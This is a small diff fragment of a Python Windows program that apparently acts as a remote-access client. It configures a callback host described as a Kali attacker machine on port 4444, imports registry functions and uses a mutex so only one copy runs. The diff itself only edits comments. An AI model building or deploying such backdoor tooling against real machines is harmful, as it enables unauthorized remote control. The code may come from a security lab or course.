@@ -29,6 +29,7 @@ from winreg import *
 
 
 # Step 2: Define Global Variables
+# TODO: for testing change SERVER_HOST to Kali WSL IP Address
 SERVER_HOST = "192.168.10.100"
 SERVER_PORT = 4444
 
@@ -40,7 +41,7 @@ intBuffer = 1024
 # Step 3: Define and Create Mutex Object
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
 
-# if Mutex is Already Created(mean app is running now), Exit the App
+# if Mutex is Already Created (mean app is running now), Exit the App
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
     exit(0)
